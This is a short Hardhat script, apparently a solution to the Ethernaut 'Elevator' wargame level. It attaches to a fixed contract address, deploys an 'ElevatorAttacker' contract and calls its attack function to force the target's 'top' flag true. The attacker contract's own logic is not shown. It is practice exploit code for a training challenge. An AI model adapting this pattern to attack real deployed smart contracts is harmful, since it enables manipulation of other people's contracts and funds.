import { ethers } from "hardhat";

const CONTRACT_NAME = "Elevator";
const CONTRACT_ADDRESS = "0xA6956447702B6B2a4BEab615F2D21b535692900B";
const CONTRACT_ATTACKER_NAME = "ElevatorAttacker";

async function hack() {
  const factory = await ethers.getContractFactory(CONTRACT_NAME);
  const contract = factory.attach(CONTRACT_ADDRESS);

  //deploy attacker contract
  const attackerFactory = await ethers.getContractFactory(
    CONTRACT_ATTACKER_NAME
  );
  const attackerContract = await attackerFactory.deploy();

  //call hack function
  const txAttack = await attackerContract.attack(1, contract.address);
  await txAttack.wait();

  //check if contract is hacked
  const isOnTop = await contract.top();

  if (isOnTop) console.log("🚀 Contract hacked");
  else console.log("❌ Contract not hacked");
}

hack().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
